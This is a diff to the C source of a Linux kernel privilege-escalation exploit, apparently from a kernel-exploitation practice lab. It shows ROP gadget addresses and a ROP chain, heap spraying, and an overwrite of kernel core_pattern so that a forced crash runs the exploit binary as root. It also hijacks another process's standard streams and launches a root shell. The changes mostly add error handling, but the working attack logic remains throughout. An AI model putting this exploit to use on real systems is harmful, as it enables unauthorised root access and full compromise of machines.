@@ -60,14 +60,6 @@
 #define POP_RDX_POP_RDI			0xffffffff8158f54fUL /* pop rdx ; pop rdi ; ret */
 #define POP_RSI				0xffffffff81d1da59UL /* pop rsi ; ret */
 
-/* core_pattern stuff */
-#define SYSCHK(x)                                 \
-	({                                        \
-		typeof(x) __res = (x);            \
-		if (__res == (typeof(x))-1)       \
-			err(1, "SYSCHK(" #x ")"); \
-		__res;                            \
-	})
 static const char fake_core_pattern[] = "|/proc/%P/fd/666 %P";
 
 /* ========================================================================== */
@@ -112,7 +104,7 @@ void do_ptregs_pass(void)
 		".att_syntax;");
 }
 
-void run_sh(void)
+int run_sh(void)
 {
 	pid_t pid = -1;
 	char *args[] = {
@@ -126,7 +118,7 @@ void run_sh(void)
 
 	if (pid < 0) {
 		perror("[-] fork");
-		return;
+		return EXIT_FAILURE;
 	}
 
 	if (pid == 0) {
@@ -138,6 +130,8 @@ void run_sh(void)
 
 		printf("[+] /bin/sh finished\n");
 	}
+
+	return EXIT_SUCCESS;
 }
 
 static const unsigned long rop_chain[0x60] = {
@@ -204,6 +198,10 @@ int check_core()
 	/* check if /proc/sys/kernel/core_pattern has been overwritten */
 	char buf[0x100] = {};
 	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
+	if (core < 0) {
+		perror("[-] open");
+		return EXIT_FAILURE;
+	}
 	read(core, buf, sizeof(buf));
 	close(core);
 	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
@@ -212,7 +210,15 @@ int check_core()
 void crash(char *cmd)
 {
 	int memfd = memfd_create("", 0);
-	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
+	if (memfd < 0) {
+		perror("[-] memfd_create");
+		return;
+	}
+	if (sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff) < 0) {
+		perror("[-] sendfile");
+		close(memfd);
+		return;
+	}
 	dup2(memfd, 666);
 	close(memfd);
 	while (check_core() == 0)
@@ -223,6 +229,7 @@ void crash(char *cmd)
 	 */
 	*(size_t *)0 = 0;
 }
+
 int main(int argc, char **argv)
 {
 	int result = EXIT_FAILURE;
@@ -230,20 +237,39 @@ int main(int argc, char **argv)
 	int ret = EXIT_FAILURE;
 	int act_fd = -1;
 	int spray_fd = -1;
+	int pid = -1;
+	int stdinfd, stdoutfd, stderrfd = -1;
+	char path0[64], path1[64], path2[64];
 
 	if (argc > 1) {
-		int pid = strtoull(argv[1], 0, 10);
-		int pfd = syscall(SYS_pidfd_open, pid, 0);
-		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
-		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
-		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
-		dup2(stdinfd, 0);
-		dup2(stdoutfd, 1);
-		dup2(stderrfd, 2);
+		pid = strtoull(argv[1], NULL, 10);
+		snprintf(path0, sizeof(path0), "/proc/%d/fd/0", pid);
+		snprintf(path1, sizeof(path1), "/proc/%d/fd/1", pid);
+		snprintf(path2, sizeof(path2), "/proc/%d/fd/2", pid);
+		stdinfd = open(path0, O_RDONLY);
+		stdoutfd = open(path1, O_WRONLY);
+		stderrfd = open(path2, O_WRONLY);
+		if (stdinfd < 0 || stdoutfd < 0 || stderrfd < 0) {
+			perror("[-] open");
+			goto end;
+		}
+		if (dup2(stdinfd, 0) < 0 || dup2(stdoutfd, 1) < 0 ||
+		    dup2(stderrfd, 2) < 0) {
+			perror("[-] dup2");
+			close(stdinfd);
+			close(stdoutfd);
+			close(stderrfd);
+			goto end;
+		}
+
 		if (getuid() == 0 && geteuid() == 0) {
 			printf("[+] finish as: uid=0, euid=0, start sh...\n");
 			result = EXIT_SUCCESS;
-			run_sh();
+			if (run_sh() == EXIT_FAILURE) {
+				perror("[-] runnig shell");
+				goto end;
+			}
+			goto end;
 		} else {
 			printf("[-] heap spraying\n");
 		}
@@ -255,11 +281,13 @@ int main(int argc, char **argv)
 		setsid();
 		crash("");
 	}
+
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
 
 	/*
 	 * Prepare
 	 */
+
 	spray_data = mmap(NULL, MMAP_SZ, PROT_READ | PROT_WRITE,
 					MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 	if (spray_data == MAP_FAILED) {
@@ -323,6 +351,11 @@ int main(int argc, char **argv)
 	printf("[+] DRILL_ACT_CALLBACK\n");
 
 end:
+	if (stdinfd > 0 || stdoutfd > 0 || stderrfd > 0) {
+		if (close(stdinfd) < 0 || close(stdoutfd) < 0 || close(stderrfd) < 0) {
+			perror("[-] close");
+		}
+	}
 	if (spray_fd >= 0) {
 		ret = close(spray_fd);
 		if (ret != 0)
